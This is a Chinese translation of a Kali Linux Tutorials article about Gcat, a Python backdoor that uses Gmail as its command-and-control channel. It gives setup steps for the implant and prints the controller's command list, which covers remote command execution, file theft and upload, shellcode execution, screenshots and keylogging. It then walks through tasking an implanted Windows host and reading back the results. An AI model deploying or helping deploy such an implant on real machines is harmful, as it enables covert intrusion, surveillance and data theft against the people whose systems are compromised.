# Gcat 偷偷后门使用 Gmail 作为命令和控制服务器

> 原文：<https://kalilinuxtutorials.com/gcat-gmail-command-control-server/>

Gcat 是一个基于 Python 的秘密后门，它使用 Gmail 作为命令和控制服务器。这个项目的灵感来自本杰明唐纳利的原始概念代码。

**也读作[syl kie–IPv6 地址欺骗与邻居发现协议](https://kalilinuxtutorials.com/sylkie-ipv6-address-spoofing/)**

## **设置 Gcat**

为此，您需要:

*   Gmail 帐户(使用专用帐户！不要用你的私人手机！)
*   在帐户的安全设置下打开“允许不太安全的应用程序”
*   您可能还需要在帐户设置中启用 IMAP

此回购包含两个文件:

*   用于枚举可用客户端并向其发出命令的脚本
*   `implant.py`实际的后门部署

在这两个文件中，使用您之前设置的帐户的用户名和密码编辑`gmail_user`和`gmail_pwd`变量。

您可能想要使用 Pyinstaller 将`implant.py`编译成可执行文件。

**注意:**建议您使用 32 位 Python 安装来编译 implant.py

## **用法**

```
optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -id ID                Client to target
  -jobid JOBID          Job id to retrieve

  -list                 List available clients
  -info                 Retrieve info on specified client

Commands to execute on an implant

  -cmd CMD              Execute a system command
  -download PATH        Download a file from a clients system
  -upload SRC DST       Upload a file to the clients system
  -exec-shellcode FILE  Execute supplied shellcode on a client
  -screenshot           Take a screenshot
  -lock-screen          Lock the clients screen
  -force-checkin        Force a check in
  -start-keylogger      Start keylogger
  -stop-keylogger       Stop keylogger
```

*   **一旦在几个系统上部署了后门，就可以使用 list 命令检查可用的客户端:**

```
#~ python gcat.py -list
f964f907-dfcb-52ec-a993-543f6efc9e13 Windows-8-6.2.9200-x86
90b2cd83-cb36-52de-84ee-99db6ff41a11 Windows-XP-5.1.2600-SP3-x86
```

输出是一个 UUID 字符串，它唯一地标识系统和运行植入的操作系统

*   **让我们向一个植入物发出命令:**

```
#~ python gcat.py -id 90b2cd83-cb36-52de-84ee-99db6ff41a11 -cmd 'ipconfig /all'
[*] Command sent successfully with jobid: SH3C4gv
```

这里我们告诉`90b2cd83-cb36-52de-84ee-99db6ff41a11`执行`ipconfig /all`，然后脚本输出`jobid`，我们可以用它来检索该命令的输出

*   让我们看看结果吧！

```
#~ python gcat.py -id 90b2cd83-cb36-52de-84ee-99db6ff41a11 -jobid SH3C4gv     
DATE: 'Tue, 09 Jun 2015 06:51:44 -0700 (PDT)'
JOBID: SH3C4gv
FG WINDOW: 'Command Prompt - C:\Python27\python.exe implant.py'
CMD: 'ipconfig /all'
```

```
Windows IP Configuration

        Host Name . . . . . . . . . . . . : unknown-2d44b52
        Primary Dns Suffix  . . . . . . . : 
        Node Type . . . . . . . . . . . . : Unknown
        IP Routing Enabled. . . . . . . . : No
        WINS Proxy Enabled. . . . . . . . : No**

**-- SNIP --
```

*   这就是它的主旨！但是您可以做更多的事情，正如您可以从脚本的用法中看到的那样！

[![](img/d861a9096555aeb1980fc054015933d7.png)](https://github.com/byt3bl33d3r/gcat)